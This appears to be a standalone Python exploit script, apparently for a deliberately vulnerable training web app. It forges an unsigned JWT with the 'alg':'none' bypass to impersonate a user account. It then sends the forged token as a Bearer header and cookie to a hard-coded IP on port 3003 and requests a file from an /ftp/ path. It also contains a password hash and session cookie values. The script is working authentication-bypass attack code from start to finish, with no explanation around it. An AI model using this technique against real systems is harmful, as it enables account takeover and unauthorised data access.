import json

import requests

import jwt
import base64

# header = '{"alg":"RS256","typ":"JWT"}'

header = '{"alg":"none","typ":"JWT"}'

payload = '{"status":"success","data":{"id":1,"email":"BumblebeeMan@kwike.mart","password":"7c6a180b36896a0a8c02787eeafb0e4c","createdAt":"2018-06-22T22:02:50.423Z","updatedAt":"2018-06-22T22:02:50.423Z"},"iat":1530237826,"exp":1530255826}'

signature = ''


def encode(str):
    return base64.b64encode(str.encode('utf-8')).decode("utf-8").replace('=', '')


token = encode(header) + '.' + encode(payload) + "." + encode(signature)

print(token)

data = {"message": "Bumble bee man!", "author": "BumblebeeMan@kwike.mart"}
data_json = json.dumps(data)
headers = {
    'Content-type': 'application/pdf;charset=utf-8',
    'Accept': 'application/pdf',
    'X-User-Email': 'Homer@kwike.mart',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'Referer': 'http://43.241.202.33:3003/',
    'Authorization': 'Bearer ' + token
}
cookies = {
    'io': 'zajAOf3mZ3wQrtoDAAGt',
    'cookieconsent_status': 'dismiss',
    'email': 'Homer%40kwike.mart',
    'token': token,
}

r = requests.get(
    'http://43.241.202.33:3003/ftp/URL.wordlist',
    data=data_json,
    headers=headers,
    cookies=cookies,
)

# if r.status_code == 200:
print(r.status_code, r.url)

print(r.headers)
